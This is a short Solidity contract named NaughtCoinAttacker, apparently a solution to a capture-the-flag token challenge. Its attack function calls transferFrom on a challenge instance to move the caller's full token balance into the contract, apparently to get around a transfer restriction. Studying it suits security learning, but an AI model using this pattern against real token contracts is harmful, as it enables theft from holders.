// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

contract NaughtCoinAttacker {
    address public challengeInstance;

    constructor(address _challengeInstance) {
        challengeInstance = _challengeInstance;
    }

    function attack() external {
        challengeInstance.call(abi.encodeWithSignature(
            "transferFrom(address,address,uint256)",
            msg.sender,
            address(this),
            1000000 * (10**18)
        ));
    }
}